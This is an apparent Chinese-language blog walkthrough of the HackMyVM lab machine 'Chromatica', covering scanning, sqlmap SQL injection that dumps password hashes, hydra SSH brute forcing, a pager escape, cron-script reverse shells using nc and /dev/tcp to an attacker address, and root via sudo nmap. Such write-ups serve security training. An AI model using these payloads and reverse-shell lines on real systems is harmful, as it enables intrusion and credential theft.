---
title: Chromatica
author: hgbe02
date: 2024-05-13
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Chromatica.html"
---

# Chromatica

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922881.png" alt="image-20240513175133861" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922883.png" alt="image-20240513175624073" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ rustscan -a 172.20.10.3 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.20.10.3:22
Open 172.20.10.3:80
Open 172.20.10.3:5353

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBILuE7emxat5+R/en2quENVPigrmN45CWha4pupWvL0lT1/q0tFYaB0LoABPlVKs5/Dob23Exi5jYdV1PugUPlM=|   256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIISi3povKIr32D6ShYBi21LE4gRFcGy/pMv/ccuSu1Xs
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Chromatica|Coming Soon..... 
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
5353/tcp open  domain  syn-ack dnsmasq 2.86
| dns-nsid: 
|_  bind.version: dnsmasq-2.86
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ gobuster dir -u http://172.20.10.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,txt,html,zip,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 4047]
/assets               (Status: 301) [Size: 311] [--> http://172.20.10.3/assets/]
/css                  (Status: 301) [Size: 308] [--> http://172.20.10.3/css/]
/js                   (Status: 301) [Size: 307] [--> http://172.20.10.3/js/]
/javascript           (Status: 301) [Size: 315] [--> http://172.20.10.3/javascript/]
/robots.txt           (Status: 200) [Size: 36]
Progress: 64049 / 1323366 (4.84%)[ERROR] Get "http://172.20.10.3/2005-February.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3/2005-February.zip": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3/2506.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3/2506.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3/2005-March.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.3/2005-February.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 64059 / 1323366 (4.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 64069 / 1323366 (4.84%)
===============================================================
Finished
===============================================================
```

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ sudo dirsearch -u http://172.20.10.3 -e* -i 200,300-399 2>/dev/null
[sudo] password for kali: 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 14594

Output File: /home/kali/temp/chromatica/reports/http_172.20.10.3/_24-05-13_06-01-27.txt

Target: http://172.20.10.3/

[06:01:27] Starting: 
[06:01:27] 301 -  307B  - /js  ->  http://172.20.10.3/js/
[06:01:53] 301 -  311B  - /assets  ->  http://172.20.10.3/assets/
[06:01:53] 200 -  488B  - /assets/
[06:01:59] 301 -  308B  - /css  ->  http://172.20.10.3/css/
[06:02:11] 301 -  315B  - /javascript  ->  http://172.20.10.3/javascript/
[06:02:11] 200 -  504B  - /js/
[06:02:30] 200 -   36B  - /robots.txt

Task Completed
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922884.png" alt="image-20240513175714791" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922886.png" alt="image-20240513175729347" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922887.png" alt="image-20240513175741760" style="zoom:33%;" />

### 敏感目录

```apl
http://172.20.10.3/robots.txt
```

```text
user-agent: dev
Allow: /dev-portal/
```

尝试使用wpscan扫一下：

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ wpscan --url http://172.20.10.3 -e u --api-token xxxxxx
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.


Scan Aborted: The remote website is up, but does not seem to be running WordPress.
```

看来现在还不是时候，继续尝试：

### FUZZ

指定`User-agent`尝试进行扫描：

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ gobuster dir -u http://172.20.10.3/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,txt,html,zip,php -H "User-agent: dev"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.3/dev-portal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 527]
/login.php            (Status: 200) [Size: 609]
/search.php           (Status: 200) [Size: 844]
/assets               (Status: 301) [Size: 322] [--> http://172.20.10.3/dev-portal/assets/]
/css                  (Status: 301) [Size: 319] [--> http://172.20.10.3/dev-portal/css/]
Progress: 18192 / 1323366 (1.37%)
[!] Keyboard interrupt detected, terminating.
Progress: 18197 / 1323366 (1.38%)
===============================================================
Finished
===============================================================
```

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ feroxbuster -u http://172.20.10.3/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-agent: dev" -d 3 -s 200 301 302 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.20.10.3/dev-portal/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ User-agent:  dev
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 3
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        2l       33w      844c http://172.20.10.3/dev-portal/search.php
301      GET        9l       28w      322c http://172.20.10.3/dev-portal/assets => http://172.20.10.3/dev-portal/assets/
200      GET     1521l     7816w   611312c http://172.20.10.3/dev-portal/assets/img/bg-mobile-fallback.jpg
301      GET        9l       28w      319c http://172.20.10.3/dev-portal/css => http://172.20.10.3/dev-portal/css/
200      GET       92l      170w     1508c http://172.20.10.3/dev-portal/css/style.css
200      GET       19l       39w      527c http://172.20.10.3/dev-portal/
200      GET       63l      119w     1045c http://172.20.10.3/dev-portal/css/login.css
[####################] - 3m    220561/220561  0s      found:7       errors:2      
[####################] - 3m    220546/220546  1056/s  http://172.20.10.3/dev-portal/ 
[####################] - 4s    220546/220546  57314/s http://172.20.10.3/dev-portal/css/ => Directory listing
[####################] - 0s    220546/220546  11027300/s http://172.20.10.3/dev-portal/assets/ => Directory listing
[####################] - 0s    220546/220546  1480174/s http://172.20.10.3/dev-portal/assets/img/ => Directory listing
```

进行查看：

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ curl -i -s http://172.20.10.3/dev-portal/search.php -H "User-Agent: dev"
HTTP/1.1 200 OK
Date: Mon, 13 May 2024 10:24:13 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: User-Agent,Accept-Encoding
Content-Length: 844
Content-Type: text/html; charset=UTF-8

<table><tr><th>City</th><th>Population</th><th>Postal Code</th></tr><tr><td>New York City</td><td>8336817</td><td>10001</td></tr><tr><td>Los Angeles</td><td>3979576</td><td>90001</td></tr><tr><td>Chicago</td><td>2693976</td><td>60601</td></tr><tr><td>Houston</td><td>2320268</td><td>77001</td></tr><tr><td>Phoenix</td><td>1680992</td><td>85001</td></tr><tr><td>Philadelphia</td><td>1584064</td><td>19101</td></tr><tr><td>San Antonio</td><td>1547253</td><td>78201</td></tr><tr><td>San Diego</td><td>1425976</td><td>92101</td></tr><tr><td>Dallas</td><td>1317929</td><td>75201</td></tr><tr><td>San Jose</td><td>1030119</td><td>95101</td></tr><tr><td>Paris</td><td>2140526</td><td>75001</td></tr></table><a href="index.html"> take me back </a>
<!-- please for the love of god someone paint this page a color will ya it looks dreadfull uhhhhj -->
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922888.png" alt="image-20240513182512839" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922889.png" alt="image-20240513183546510" style="zoom:50%;" />

### sql注入

尝试抓包进行sql注入：

```bash
POST /dev-portal/login.php HTTP/1.1
Host: 172.20.10.3
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.20.10.3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.20.10.3/dev-portal/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&password=password&login=
```

修改掉`User-Agent`然后尝试注入：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922890.png" alt="image-20240513183026026" style="zoom:67%;" />

嘶。。。。

换一个看看：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922891.png" alt="image-20240513183628435" style="zoom:50%;" />

尝试进行注入：

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ sqlmap -u "http://172.20.10.3/dev-portal/search.php?city=Chicago" --user-agent="dev"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
      
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=Chicago' AND (SELECT 9837 FROM (SELECT(SLEEP(5)))RDYU) AND 'vCNS'='vCNS

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=Chicago' UNION ALL SELECT NULL,CONCAT(0x716b707171,0x655952524c7a6b4a6c486775534d474c714c574b6844714c45696e724c76514a696866515a6b5062,0x71786a6b71),NULL,NULL-- -
---
```

```bash
sqlmap -u "http://172.20.10.3/dev-portal/search.php?city=Chicago" --user-agent="dev" --dbs
available databases [2]:
[*] Chromatica
[*] information_schema

sqlmap -u "http://172.20.10.3/dev-portal/search.php?city=Chicago" --user-agent="dev" -D Chromatica --tables
Database: Chromatica
[2 tables]
+--------+
| cities |
| users  |
+--------+

sqlmap -u "http://172.20.10.3/dev-portal/search.php?city=Chicago" --user-agent="dev" -D Chromatica -T users --dump
Database: Chromatica                                                                                                                                             
Table: users
[5 entries]
+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+
```

尝试破解一下其他的

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922892.png" alt="image-20240513184047741" style="zoom:50%;" />

构造字典进行爆破：

```apl
admin
dev
user
dev-selim
intern
```

```apl
adm!n
flaghere
intern00
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9
keeptrying
3dd0f70a06e2900693fc4b684484ac85
```

尝试爆破：

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ vim user.txt

┌──(kali💀kali)-[~/temp/chromatica]
└─$ vim pass.txt

┌──(kali💀kali)-[~/temp/chromatica]
└─$ hydra -L user.txt -P pass.txt ssh://172.20.10.3 2>/dev/null
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-13 06:43:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 45 login tries (l:5/p:9), ~3 tries per task
[DATA] attacking ssh://172.20.10.3:22/
[22][ssh] host: 172.20.10.3   login: dev   password: flaghere
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-13 06:43:20
```

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ ssh dev@172.20.10.3                                         
The authenticity of host '172.20.10.3 (172.20.10.3)' can't be established.
ED25519 key fingerprint is SHA256:+czsuAWX6K/5Q5qXxqH5/OquiT/4/G1bJTK0Urs9Z2E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.20.10.3' (ED25519) to the list of known hosts.
dev@172.20.10.3's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

    brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 172.20.10.3 closed.
```

但是提交发现flag不对。。。

```apl
大家好，
此帐户不是登录帐户。
如果您想对此帐户进行一些维护，您必须。
或者联系您的管理员。
或者跳出框框去思考。
懒惰，联系你的管理员。
或许你应该多动动脑筋哈，
问候。

Brightctf{ALM0ST_TH3R3_34897ffdf69}
```

尝试登录页面，但是什么东西也没有。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922893.png" alt="image-20240513185900758" style="zoom:50%;" />

尝试ssh连接，输出报错：

```bash
ssh dev@172.20.10.3 -v
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922894.png" alt="image-20240513190021103" style="zoom:50%;" />

发现其实进入交互界面了，联想到作者提到的换一个思路，以前做过一个机子是需要利用less进行缩小提权的，所以。。。。尝试在虚拟机进行缩小进行交互，发现存在`more`可以进行提权：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922895.png" alt="image-20240513190520777" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922896.png" alt="image-20240513190128086" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
dev@Chromatica:~$ sudo -l
[sudo] password for dev:                                                                        
Sorry, user dev may not run sudo on Chromatica.                                                 
dev@Chromatica:~$ ls -la                                                                        
total 72                                                                                        
drwxr-x--- 7 dev  dev  4096 Apr 18 07:57 .                                                      
drwxr-xr-x 4 root root 4096 Mar 28  2023 ..                                                     
-rw------- 1 dev  dev  3504 May 13 11:02 .bash_history                                          
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout                                           
-rw-r--r-- 1 dev  dev  3814 Mar 28  2023 .bashrc                                                
-rwxrwxr-x 1 root root   56 Mar 28  2023 bye.sh                                                 
drwx------ 2 dev  dev  4096 Mar 21  2023 .cache                                                 
drwxrwxr-x 3 dev  dev  4096 Mar 21  2023 .config                                                
drwx------ 3 dev  dev  4096 Apr 18 07:36 .gnupg                                                 
-rw-rw-r-- 1 root root  280 Jun  2  2023 hello.txt                                              
-rw------- 1 dev  dev    20 Mar 28  2023 .lesshst                                               
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile                                               
drwx------ 4 dev  dev  4096 Mar 27  2023 snap                                                   
-rw-r--r-- 1 root root   35 May 23  2023 user.txt                                               
drwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim                                                   
-rw------- 1 dev  dev  9900 Apr 18 07:57 .viminfo                                               
dev@Chromatica:~$ cat bye.sh 
#!/bin/bash                                                                                     
                                                                                                
/usr/bin/more /home/dev/hello.txt                                                               
exit 0                                                                                          
dev@Chromatica:~$ cat /home/dev/hello.txt                                                       
GREETINGS,                                                                                      
THIS ACCOUNT IS NOT A LOGIN ACCOUNT                                                             
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
dev@Chromatica:~$ cat .bash_history
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922897.png" alt="image-20240513190656893" style="zoom:50%;" />

看一下这个程序：

```bash
dev@Chromatica:~$ find / -name end_of_day.sh -type f 2>/dev/null
/opt/scripts/end_of_day.sh
dev@Chromatica:~$ ls -l /opt/scripts/end_of_day.sh
-rwxrwxrw- 1 analyst analyst 30 May 13 11:00 /opt/scripts/end_of_day.sh
dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh
#this is my end of day script
dev@Chromatica:~$ echo 'nc -e /bin/bash 172.20.10.8 1234' > /opt/scripts/end_of_day.sh
```

查看是否是定时任务：

```bash
dev@Chromatica:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
#
cat: /etc/cron.weekly: Is a directory
```

但是半天没弹回来，尝试换一个：

```bash
dev@Chromatica:~$ echo '/bin/bash -i >& /dev/tcp/172.20.10.8/1234 0>&1' > /opt/scripts/end_of_day.sh
```

```bash
┌──(kali💀kali)-[~/temp/chromatica]
└─$ sudo pwncat-cs -lp 1234 2>/dev/null
[07:08:23] Welcome to pwncat 🐈!                                                                                               
(remote) analyst@Chromatica:/home/analyst$ ls -la
total 64
drwxr-x--x 6 analyst analyst 4096 Apr 24 14:04 .
drwxr-xr-x 4 root    root    4096 Mar 28  2023 ..
-rw-r--r-- 1 root    root      36 May 23  2023 analyst.txt
-rw------- 1 analyst analyst 3724 Apr 24 14:05 .bash_history
-rw-r--r-- 1 analyst analyst  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 analyst analyst 3771 Jan  6  2022 .bashrc
drwx------ 2 analyst analyst 4096 Mar 23  2023 .cache
drwx------ 3 analyst analyst 4096 Jun 19  2023 .config
drwx------ 3 analyst analyst 4096 Mar 27  2023 .gnupg
-rw-rw-r-- 1 analyst analyst   96 Mar 21  2023 hello.txt
-rw-r--r-- 1 analyst analyst  807 Jan  6  2022 .profile
-rw-rw-r-- 1 analyst analyst   75 Mar 21  2023 .selected_editor
drwx------ 4 analyst analyst 4096 Mar 27  2023 snap
-rw------- 1 analyst analyst 9275 Apr 24 14:04 .viminfo
(remote) analyst@Chromatica:/home/analyst$ sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap
```

进行提权：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922898.png" alt="image-20240513191746623" style="zoom: 33%;" />

```bash
(remote) analyst@Chromatica:/home/analyst$ TF=$(mktemp)
(remote) analyst@Chromatica:/home/analyst$ echo 'os.execute("/bin/sh")' > $TF
(remote) analyst@Chromatica:/home/analyst$ echo 'os.execute("/bin/bash")' > $TF
(remote) analyst@Chromatica:/home/analyst$ sudo /usr/bin/nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-13 11:16 UTC
NSE: Warning: Loading '/tmp/tmp.9WwYZMchCS' -- the recommended file extension is '.nse'.
uid=0(root) gid=0(root) groups=0(root)
root@Chromatica:~# 
```

拿下！！！！！

纪念一下，两个小时拿下第一台全一血！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202405131922899.png" alt="image-20240513191916655" style="zoom:33%;" />